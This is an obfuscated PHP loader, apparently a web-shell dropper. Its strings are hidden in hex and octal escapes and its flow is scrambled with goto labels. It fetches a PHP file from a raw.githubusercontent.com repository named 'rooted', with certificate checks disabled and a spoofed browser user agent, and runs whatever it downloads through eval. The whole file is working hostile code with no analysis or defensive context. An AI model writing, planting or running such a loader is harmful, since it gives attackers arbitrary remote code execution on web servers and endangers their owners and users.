<?php
 goto d2EwV; d2EwV: function geturlsinfo($url) { if (function_exists("\x63\165\x72\154\x5f\145\170\x65\143")) { $conn = curl_init($url); curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1); curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($conn, CURLOPT_USERAGENT, "\115\157\172\151\154\x6c\x61\x2f\x35\56\60\40\50\x57\151\156\144\x6f\167\x73\x20\116\124\40\66\56\x31\73\40\x72\x76\72\x33\x32\x2e\x30\51\x20\x47\x65\143\x6b\157\x2f\x32\60\x31\x30\x30\61\x30\61\x20\106\x69\162\145\146\157\170\x2f\63\62\x2e\60"); curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0); $url_get_contents_data = curl_exec($conn); curl_close($conn); } elseif (function_exists("\146\151\x6c\x65\x5f\147\x65\x74\137\x63\157\x6e\x74\x65\x6e\x74\x73")) { $url_get_contents_data = file_get_contents($url); } elseif (function_exists("\x66\x6f\x70\x65\x6e") && function_exists("\x73\x74\162\x65\141\155\x5f\x67\x65\x74\x5f\143\x6f\x6e\x74\x65\156\164\x73")) { $handle = fopen($url, "\x72"); $url_get_contents_data = stream_get_contents($handle); fclose($handle); } else { $url_get_contents_data = false; } return $url_get_contents_data; } goto ixVwv; ixVwv: $a = geturlsinfo("\150\164\164\x70\163\72\x2f\x2f\162\141\167\x2e\x67\x69\164\150\x75\142\165\163\145\162\x63\157\x6e\164\145\156\164\56\143\157\x6d\57\163\x75\144\157\x73\165\x73\x75\70\70\x2f\x72\157\157\164\x65\144\57\155\x61\x69\x6e\x2f\x62\151\163\x61\x2e\160\150\160"); goto FjOy_; FjOy_: eval("\x3f\76" . $a);
